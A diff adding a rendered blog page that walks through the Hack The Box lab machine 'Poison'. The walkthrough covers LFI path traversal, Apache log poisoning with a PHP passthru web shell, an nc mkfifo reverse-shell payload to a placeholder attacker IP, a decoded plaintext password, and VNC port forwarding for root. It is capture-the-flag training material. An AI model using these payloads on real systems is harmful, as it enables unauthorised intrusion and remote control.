@@ -1,0 +1,201 @@
+I"d <h1 id="introductionpoison">Introduction@Poison:~$</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Column</th>
+      <th>Details</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Name</td>
+      <td>Poison</td>
+    </tr>
+    <tr>
+      <td>IP</td>
+      <td>10.10.10.84</td>
+    </tr>
+    <tr>
+      <td>Points</td>
+      <td>30</td>
+    </tr>
+    <tr>
+      <td>Os</td>
+      <td>FreeBSD</td>
+    </tr>
+    <tr>
+      <td>Difficult</td>
+      <td>Medium</td>
+    </tr>
+    <tr>
+      <td>Creator</td>
+      <td><a href="">unknown</a></td>
+    </tr>
+    <tr>
+      <td>Out on</td>
+      <td>2018</td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="summary">Summary:~$</h1>
+
+<ul>
+  <li>Discovering the new host and scanning for open ports.</li>
+  <li>LFI vulnerability in the search tab.</li>
+  <li>Accessing <code class="language-plaintext highlighter-rouge">httpd-access.log</code> which further led to <code class="language-plaintext highlighter-rouge">log poisoning</code>.</li>
+  <li>Getting <code class="language-plaintext highlighter-rouge">reverse shell</code> as <em>www</em>.</li>
+  <li>Decoding a <em>base64</em> password to log into <code class="language-plaintext highlighter-rouge">SSH</code>.</li>
+  <li>Exploiting <code class="language-plaintext highlighter-rouge">VNC</code> with a secret file to get Root.</li>
+</ul>
+
+<h1 id="starting">Starting:~$</h1>
+
+<h2 id="nmap">Nmap</h2>
+
+<p>Using <code class="language-plaintext highlighter-rouge">Nmap</code> to scan the host.</p>
+
+<p><strong>Command</strong>: <em>nmap -p- -sV -T4 10.10.10.84</em></p>
+
+<hr />
+
+<p><img src="/assets/img/poison-hackthebox/nmap-scans.png" alt="" /></p>
+
+<p>Accessing <code class="language-plaintext highlighter-rouge">Port 80</code>, We got a search bar.</p>
+
+<hr />
+
+<p><img src="/assets/img/poison-hackthebox/port-80-2.png" alt="" /></p>
+
+<p>I search <code class="language-plaintext highlighter-rouge">info.php</code>, and checked the URL.</p>
+
+<hr />
+
+<p><img src="/assets/img/poison-hackthebox/info-php-3.png" alt="" /></p>
+
+<p>Let’s try <code class="language-plaintext highlighter-rouge">LFI</code> i.e. <em>Local File Inclusion</em>.</p>
+
+<p><strong>Command</strong>: <em>http://10.10.10.84/browse.php?file=../../../../../../../../../../../../../../../etc/passwd</em></p>
+
+<p>Checking view-source page for better understanding.</p>
+
+<hr />
+
+<p><img src="/assets/img/poison-hackthebox/got-etc-passwd-4.png" alt="" /></p>
+
+<p>We got the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file. After that I googled <em>LFI to RCE php</em> and found this <a href="https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/">blog</a></p>
+
+<p>Accessing <code class="language-plaintext highlighter-rouge">/var/log/httpd-access.log</code>. We got this:</p>
+
+<hr />
+
+<p><img src="/assets/img/poison-hackthebox/httpd-access-logs-7.png" alt="" /></p>
+
+<p>I found another <a href="https://roguecod3r.wordpress.com/2014/03/17/lfi-to-shell-exploiting-apache-access-log/">blog</a> on <code class="language-plaintext highlighter-rouge">LFI</code> to <code class="language-plaintext highlighter-rouge">RCE</code>.</p>
+
+<p>Following the steps as mentioned in the blog, I injected a <code class="language-plaintext highlighter-rouge">single line php shell</code>.</p>
+
+<p><strong>Command</strong>: <em>GET /&lt;?php passthru($_GET[‘cmd’]); ?&gt; HTTP/1.1</em></p>
+
+<hr />
+
+<p><img src="/assets/img/poison-hackthebox/running-terminal-bad-req-9.png" alt="" /></p>
+
+<p>Checking <code class="language-plaintext highlighter-rouge">id</code> command.</p>
+
+<hr />
+
+<p><img src="/assets/img/poison-hackthebox/got-command-execution-10.png" alt="" /></p>
+
+<p>Now let’s get a <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse shell</a>, using Burp.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><strong>Payload</strong>: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f</td>
+      <td>/bin/sh -i 2&gt;&amp;1</td>
+      <td>nc 10.10.X.X 1234 &gt;/tmp/f</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Sending the request by URL encoding (using <code class="language-plaintext highlighter-rouge">cntrl+u</code>).</p>
+
+<hr />
+
+<p><img src="/assets/img/poison-hackthebox/got-shell-13.png" alt="" /></p>
+
+<p>We got a shell as <code class="language-plaintext highlighter-rouge">www</code>.</p>
+
+<p>Now we don’t have permissions to read <em>user flag</em>, so I check each directory manually and found this : <code class="language-plaintext highlighter-rouge">/usr/local/www/apache24/data/pwdbackup.txt</code></p>
+
+<hr />
+
+<p><img src="/assets/img/poison-hackthebox/got-pwdbackup-14.png" alt="" /></p>
+
+<p>Used an online tool to decode it with <code class="language-plaintext highlighter-rouge">base64</code>. Got password as <code class="language-plaintext highlighter-rouge">Charix!2#4%6&amp;8(0</code>.</p>
+
+<hr />
+
+<p><img src="/assets/img/poison-hackthebox/got-password-for-charix-15.png" alt="" /></p>
+
+<p>Logging in as <code class="language-plaintext highlighter-rouge">charix</code> in SSH and got <code class="language-plaintext highlighter-rouge">user flag</code>.</p>
+
+<hr />
+
+<p><img src="/assets/img/poison-hackthebox/loggedin-as-ssh-charix-16.png" alt="" /></p>
+
+<p>For privilege escalation, I found a file named <code class="language-plaintext highlighter-rouge">secret.zip</code> which requires a passcode.</p>
+
+<hr />
+
+<p><img src="/assets/img/poison-hackthebox/secret-zip-17.png" alt="" /></p>
+
+<p>Let’s download this file to our local machine using <a href="https://www.linuxtechi.com/scp-command-examples-in-linux/">scp</a>.</p>
+
+<p><strong>Command on your local machine</strong>: <em>scp charix@10.10.10.84:/home/charix/secret.zip /tmp</em></p>
+
+<p>I tried <code class="language-plaintext highlighter-rouge">zip2john</code> to crack the password but nothing worked, finally I tried charix’s password i.e. <em>Charix!2#4%6&amp;8(0</em> and it worked.</p>
+
+<p>We got a file called <code class="language-plaintext highlighter-rouge">secret</code>.</p>
+
+<hr />
+
+<p><img src="/assets/img/poison-hackthebox/cracked-secret-zip-using-previous-password-19.png" alt="" />.</p>
+
+<p>Now let’s run <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh">linpeas.sh</a>on victim machine using wget and hosting it on local system.</p>
+
+<p><strong>Wget Command</strong>: <em>wget http://10.10.X.X:8081/linpeas.sh</em></p>
+
+<p><strong>Hosting Command</strong>: <em>python3 -m http.server 8081</em></p>
+
+<p>Running it by giving executable permissions: <em>chmod +x linpeas.sh</em>, I found something interesting:</p>
+
+<hr />
+
+<p><img src="/assets/img/poison-hackthebox/active-ports-in-linpeas-20.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">Port 5901 and 5801</code> are running locally, I googled about it and found those ports are for <code class="language-plaintext highlighter-rouge">VNC</code>: <em>Virtual Network Computing (VNC) is a graphical desktop-sharing system that uses the Remote Frame Buffer protocol (RFB) to remotely control another computer. It transmits the keyboard and mouse events from one computer to another, relaying the graphical-screen updates back in the other direction, over a network.</em></p>
+
+<p>I checked VNC using <code class="language-plaintext highlighter-rouge">ps aux</code> and found it running as root.</p>
+
+<hr />
+
+<p><img src="/assets/img/poison-hackthebox/vnc-running-as-root-21.png" alt="" /></p>
+
+<p>To run <code class="language-plaintext highlighter-rouge">vnc</code> we need port forwarding as it won’t be able to run from the victim machine.</p>
+
+<p><strong>Commands for SSH port forwarding</strong>: <em>ssh -L 5000:127.0.0.1:5901 charix@10.10.10.84</em>   (on local machine)</p>
+
+<p>Now <code class="language-plaintext highlighter-rouge">VNC</code> is running locally on port <code class="language-plaintext highlighter-rouge">5000</code> on our environment.</p>
+
+<p><strong>Command</strong>: <em>vncviewer -passwd secret 127.0.0.1:5000.</em> (download vncviewer using <em>sudo apt-get install vncviewer</em>).</p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">secret</code> file as the password to access <em>VNC</em>, We got Root.</p>
+
+<hr />
+
+<p><img src="/assets/img/poison-hackthebox/got-root-22.png" alt="" /></p>
+
+:ET
